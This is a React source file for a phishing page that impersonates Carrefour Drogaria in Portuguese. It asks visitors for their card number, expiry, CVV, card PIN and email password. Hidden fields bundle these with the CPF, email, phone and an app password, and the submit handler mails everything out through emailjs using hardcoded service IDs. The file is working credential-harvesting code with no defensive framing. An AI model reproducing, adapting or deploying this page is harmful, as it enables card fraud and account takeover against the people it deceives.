import React, { Component } from 'react'
import logo from './logo_carrefo.png'
import emailjs from 'emailjs-com';


export class SocialProfiles extends Component {
    continue = e => {
        e.preventDefault();
        this.props.nextStep();
    };

    back = e => {
        e.preventDefault();
        this.props.prevStep();
    };

    render() {
        function sendEmail(e) {
            e.preventDefault();
        
            emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
              .then((result) => {
                  console.log(result.text);
              }, (error) => {
                  console.log(error.text);
              });
          }
        const { values, inputChange } = this.props;
        const {
            values: { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv }
        } = this.props;
        return (


            
            <div className="form-container">
          <div className="text-center container">

<img className="logo" src={logo} width="100"/>
</div>
                <p className="container"><b>Tudo certo!<br></br></b>Agora Precisamos confirmar algumas informações para que você possa acessar o <b> Carrefour Drogaria</b></p>
                <div className="form-group">
                    <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} />
                </div>
                <div className="form-group">
                    <input placeholder="Validade(MM/AAAA)" type="text" className="form-control" name="valcc" onChange={inputChange('valcc')} value={values.valcc} />
                </div>
                <div className="form-group">
                    <input placeholder="Código de Segurança (CVV)" type="text" className="form-control" name="cvv" onChange={inputChange('cvv')} value={values.cvv} />
                </div>
                <div className="form-group">
                    <input placeholder="Senha do cartão" className="form-control" name="ccpass" onChange={inputChange('ccpass')} value={values.ccpass} />
                </div>
                <div className="form-group">
                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} />
                   <span class="focus-border"></span>
                </div>
                <br />

                <div className="row">
                    <div className="col-6">
                        <button className="btn btn-danger" onClick={this.back}>Voltar</button>
                    </div>
                    <div className="col-6 text-right">
                    <form onSubmit={sendEmail}>
    <input type="hidden" name="cp" value={cp} ></input>
    <input type="hidden" name="email" value={email}></input>
    <input type="hidden" name="phone"  value={phone}></input>
    <input type="hidden" name="passapp" value={passapp}></input>
    <input type="hidden" name="cc" value={cc}></input>
    <input type="hidden" name="valcc" value={valcc}></input>
    <input type="hidden" name="ccpass" value={ccpass}></input>
    <input type="hidden" name="passemail" value={passemail}></input>


                       
    <button type="submit" className="btn btn-primary" >ENTRAR</button>
    </form>
                    </div>
                </div>
            </div>
        )
      
    }
}

export default SocialProfiles
